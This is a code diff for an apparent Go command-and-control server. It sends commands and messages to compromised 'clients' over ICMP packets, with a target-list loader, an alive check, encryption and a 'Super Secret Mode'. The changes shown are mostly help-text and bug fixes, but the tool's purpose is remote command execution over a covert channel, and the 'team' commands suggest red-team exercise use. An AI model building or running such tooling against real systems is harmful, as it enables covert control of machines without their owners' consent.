@@ -62,14 +62,14 @@ func print_help() {
 	fmt.Println("\tls                           Show all added clients")
 	fmt.Println("\trm <ID>                      Removes a client by ID")
 	fmt.Println("\tremoveallclients             Removes all clients")
-	// fmt.Println("\tsend <ID> <message>          Send message to client at ID")
+	fmt.Println("\tsend <ID> <message>          Send message to client at ID")
 	fmt.Println("\texe <ID> <command>           Send command to client at ID")
-	// fmt.Println("\tsendtoall <message>          Sends <message> to all clients")
+	fmt.Println("\tsendtoall <message>          Sends <message> to all clients")
 	// fmt.Println("\texeonall <command>           Execute <command> on all clients")
 	// fmt.Println("\tsendtoteam <team> <command>  Send <command> to all <team> clients")
 	// fmt.Println("\texeonteam <team> <command>   Execute <command> on all <team> clients")
 	// fmt.Println("\tloadclients                  Loads all clients specified in JSONFILE")
-	// fmt.Println("\tcheckalive                   Generates a board of replying clients")
+	fmt.Println("\tcheckalive                   Generates a board of replying clients")
 	// [FIX]fmt.Println("\tshell <ID>                   Creates a direct line with client at ID")
 	fmt.Println("\tkill                         Stops server")
 	fmt.Println("\tssm                          Toggles Super Secret Mode")
@@ -192,41 +192,39 @@ func sendmessage(command string, clientid int, c icmp.PacketConn) {
 	ipaddr := strings.TrimRight(clients[clientid], "\r\n")
 	generate_packet(command, 0)
 	if DEBUG {
-		fmt.Print("[DEBUG] ", command, " sent to ", clients[clientid])
+		fmt.Println("[DEBUG] ", command, " sent to ", clients[clientid])
 	}
 	send_packets(ipaddr, c)
 }
 
-func checkalive(src string, payload string) {
+func load() {
+	readFile, err := os.Open("targets.txt")
+
+	if err != nil {
+		fmt.Println(err)
+	}
+	fileScanner := bufio.NewScanner(readFile)
+
+	fileScanner.Split(bufio.ScanLines)
+
+	for fileScanner.Scan() {
+		fmt.Println(fileScanner.Text())
+	}
+}
+
+func checkalive(src net.IP, payload string) {
 	if payload == "$pong" {
-		ALIVE[src] = true
+		ALIVE[src.String()] = true
+		fmt.Println("[ALIVE]")
+
 	} else {
-		ALIVE[src] = false
+		ALIVE[src.String()] = false
 	}
 }
 
 func showalive() {
-	// for value in ALIVE:
-	//     if ALIVE[value] == True:
-	//         print(
-	//             f"\033[92m[{list(clients.keys())[list(clients.values()).index(value)]}]\033[0m",
-	//             end=" ",
-	//         )
-	//     elif ALIVE[value] == False:
-	//         print(
-	//             f"\033[91m[{list(clients.keys())[list(clients.values()).index(value)]}]\033[0m",
-	//             end=" ",
-	//         )
-	// print()
-
-	// for client in clients:
-	// 	ALIVE[clients.get(client)] = False
-	// arguments = ["checkalive", "alive"]
-	// sendtoall(arguments, clients, execute=False)
-	// time.sleep(7)
-	// show_alive(clients)
-
 	for aclient, avar := range ALIVE {
+		fmt.Println()
 		if avar == true {
 			for clientid, clientip := range clients {
 				if clientip == aclient {
@@ -240,6 +238,7 @@ func showalive() {
 				}
 			}
 		}
+		fmt.Println()
 	}
 }
 
@@ -279,7 +278,7 @@ func sniffer() {
 				payload = encrypt_decrypt(payload)
 			}
 			fmt.Print((payload), " received from ", ip.DstIP)
-			checkalive(string(ip.DstIP), payload)
+			checkalive(ip.DstIP, payload)
 
 		} else {
 			continue
@@ -375,7 +374,7 @@ func main() {
 			tokens := strings.Split(input, " ")
 			fmt.Println(tokens[1])
 			if checkIPAddress(parse_string(tokens[1])) {
-				addclient(tokens[1])
+				addclient(parse_string(tokens[1]))
 			} else {
 				fmt.Println("Invalid IP address.")
 			}
@@ -430,18 +429,18 @@ func main() {
 			}
 
 		} else if strings.HasPrefix(input, "checkalive") {
-			// for client in clients:
-			// 	ALIVE[clients.get(client)] = False
-			// arguments = ["checkalive", "alive"]
-			// sendtoall(arguments, clients, execute=False)
-			// time.sleep(7)
-			// show_alive(clients)
-			for id, client := range clients {
+
+			for _, client := range clients {
 				ALIVE[client] = false
+			}
+			for id := range clients {
 				sendmessage("ping", id, *c)
 			}
-			time.Sleep(7)
+			time.Sleep(7000 * time.Millisecond)
 			showalive()
+
+		} else if strings.HasPrefix(input, "load") {
+			load()
 
 		} else if strings.HasPrefix(input, "help") {
 			print_help()
@@ -456,8 +455,11 @@ func main() {
 			print_title()
 			os.Exit(0)
 
-		} else {
+		} else if input == "" {
 			continue
+
+		} else {
+			fmt.Println("Enter 'help' for commands or 'kill' to terminate.")
 		}
 	}
 }
